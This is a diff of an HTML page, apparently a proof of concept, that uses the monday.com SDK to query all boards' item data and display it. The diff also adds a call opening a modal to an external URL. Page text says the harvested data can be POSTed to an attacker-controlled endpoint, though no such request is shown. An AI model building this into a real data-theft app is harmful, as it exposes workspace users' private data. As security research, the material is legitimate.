@@ -4,13 +4,15 @@
   </head>
 <body>
   <script>
-    window.mondaySdk().api(`query { boards() { id name items { name column_values { title value } } } }`)
+    const monday = window.mondaySdk();
+    monday.api(`query { boards() { id name items { name column_values { title value } } } }`)
       .then(res => {
         const element = document.createElement('pre');
         element.innerHTML = JSON.stringify(res.data, null, 2);
         document.body.appendChild(element);
       });
-    window.mondaySdk().listen("events", (response) => console.log(response));
+    monday.listen("events", (response) => console.log(response));
+    monday.execute('openAppFeatureModal', { urlPath: 'https://javascript.com'})
   </script>
   Get all boards data.
   After fetching data it can be sent to attacker using POST request to any attacker controlled endpoint:
